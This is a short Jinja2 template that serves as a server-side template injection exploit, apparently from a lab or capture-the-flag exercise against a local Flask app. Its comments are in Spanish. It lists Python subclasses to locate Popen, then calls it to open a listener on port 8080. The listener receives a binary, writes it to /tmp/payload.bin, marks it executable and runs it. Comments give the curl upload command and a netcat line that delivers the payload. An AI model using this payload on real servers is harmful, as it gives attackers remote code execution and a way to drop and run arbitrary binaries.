{# curl -XPOST -F "profile=@test.png" http://localhost:5000/profile #}

{% set l = ''.__class__.__mro__[1].__subclasses__() %}
{% for x in l %}     
        {% if x %}
        <p>{{loop.index0}} - {{x[0]}}</p>
        {% endif %}
{% endfor %}
{#
    Así conseguimos el idx de Popen
#}
{% set res = ''.__class__.__mro__[1].__subclasses__()[223](["/usr/bin/python3", "-c", "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind(('0.0.0.0', 8080)); s.listen(1); sc,_ = s.accept(); sc.settimeout(5); f = open('/tmp/payload.bin', 'wb+'); while 1: f.write(sc.recv(1258292)); f.close(); sc.close(); s.close(); subprocess.call('chmod +x /tmp/payload.bin', shell=True); subprocess.call('/tmp/payload.bin &', shell=True);"], stdout=-1) %}

{# cat payload.sh | nc localhost 8080 #}

{#
    Así abrimos una shell (subprocess.PIPE=-1)    
#} 